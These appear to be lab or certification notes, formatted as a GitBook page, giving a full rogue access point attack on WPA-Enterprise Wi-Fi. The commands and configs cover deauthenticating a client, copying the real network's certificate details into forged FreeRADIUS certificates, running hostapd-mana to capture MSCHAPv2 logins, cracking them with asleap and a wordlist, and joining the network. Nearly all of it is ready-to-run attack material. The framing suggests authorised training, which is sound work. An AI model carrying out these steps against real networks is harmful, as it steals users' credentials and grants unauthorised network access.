---
description: WPA-Enterpise rogue AP attack
---

# WPA-MGT

### Setup

{% code overflow="wrap" %}
```
sudo airmon-ng check kill

sudo airmon-ng start wlan0
```
{% endcode %}

### [Reconnaissance](../#reconnaissance)

{% code overflow="wrap" %}
```
sudo airodump-ng wlan0mon
```
{% endcode %}

{% hint style="info" %}
Gather `CH` `ESSID` `BSSID` & Clients ; `AUTH MGT` = WPA Enterprise
{% endhint %}

#### Capture + output as recon-01.pcap

{% code overflow="wrap" %}
```
# -c channel -w output filename = recon-0#
sudo airodump-ng -c # --essid AP_NAME --bssid XX:XX:XX:XX:XX:XX -w recon --output-format pcap wlan0mon
```
{% endcode %}

#### May deauth a client once to get reconnection for cert info

{% code overflow="wrap" %}
```
#-a AP -c Client
sudo aireplay-ng -0 1 -a XX:XX:XX:XX:XX:XX -c YY:YY:YY:YY:YY:YY wlan0mon
```
{% endcode %}

#### Review the traffic / recon-01.pcap to get cert info

{% code overflow="wrap" %}
```
#wireshark filter

tls.handshake.type == 11,3
# or 
tls.handshake.certificate
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption><p>Extensible Authentication Protocol > Transport Layer Security > TLSv1 Record Layer: Handshake Protocol: Certificate > Handshake Protocol: Certificate > Certificates > Certificate</p></figcaption></figure>

{% hint style="info" %}
**for each certificate (2)**, we `right click and select Export Packet Bytes` to save the data into a file with a `.der` extension
{% endhint %}

#### Review cert info

{% code overflow="wrap" %}
```

openssl x509 -inform der -in CERTIFICATE_FILENAME -text
```
{% endcode %}

### Preparation

#### Edit freeradius cert config (as root user)

<pre data-overflow="wrap"><code><strong># /etc/freeradius/3.0/certs/ca.cnf (ca@xx.com)
</strong>
[certificate_authority]
countryName             = US
stateOrProvinceName     = CA
localityName            = San Francisco
organizationName        = Playtronics
emailAddress            = ca@playtronics.com
commonName              = "Playtronics Certificate Authority"
</code></pre>

```
# /etc/freeradius/3.0/certs/server.cnf (admin@xx.com)

[server]
countryName             = US
stateOrProvinceName     = CA
localityName            = San Francisco
organizationName        = Playtronics
emailAddress            = admin@playtronics.com
commonName              = "Playtronics"
```

#### Create fake cert (as root user)

{% code overflow="wrap" %}
```
sudo su
cd /etc/freeradius/3.0/certs/
rm dh && make
#normal to receive error as we didn't config client.cnf as no need
```
{% endcode %}

### Setup rogue AP with hostapd-mana

#### Create `mana.conf` and `mana.eap_user` to `/etc/hostapd-mana/` (as root)

{% code overflow="wrap" %}
```
#/etc/hostapd-mana/mana.eap_user

*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```
{% endcode %}

{% code overflow="wrap" %}
```
#/etc/hostapd-mana/mana.conf

# SSID of the AP
ssid=Playtronics #########UPDATE##########

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan0
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=1 #########UPDATE##########

# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g #2.4GHz, a if 5GHz#

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file we created earlier
eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=/tmp/hostapd.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP TLS MitM
mana_eaptls=1
```
{% endcode %}

#### Launch rogue AP

```
sudo hostapd-mana /etc/hostapd-mana/mana.conf
```

{% hint style="info" %}
When a victim attempts to authenticate to our AP, the login attempt is captured in mana console
{% endhint %}

#### Retrieve credentials with asleap command provided by mana

```
# -W append wordlist to the asleap crack command
<asleap cmd> -W usr/share/john/password.lst
```

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption><p>&#x3C;asleap cmd></p></figcaption></figure>

### Connect to the network with retrieved credentials

#### Create `wpa_supplicant.conf`&#x20;

{% code overflow="wrap" %}
```
network={
  ssid="NetworkName"
  scan_ssid=1
  key_mgmt=WPA-EAP
  identity="Domain\username"
  password="password"
  eap=PEAP
  phase1="peaplabel=0"
  phase2="auth=MSCHAPV2"
}
```
{% endcode %}

#### Connect to network

```
wpa_supplicant -c <config file>

sudo dhclient wlan0
```

### Get proof

```
curl http://192.168.1.1/proof.txt
```
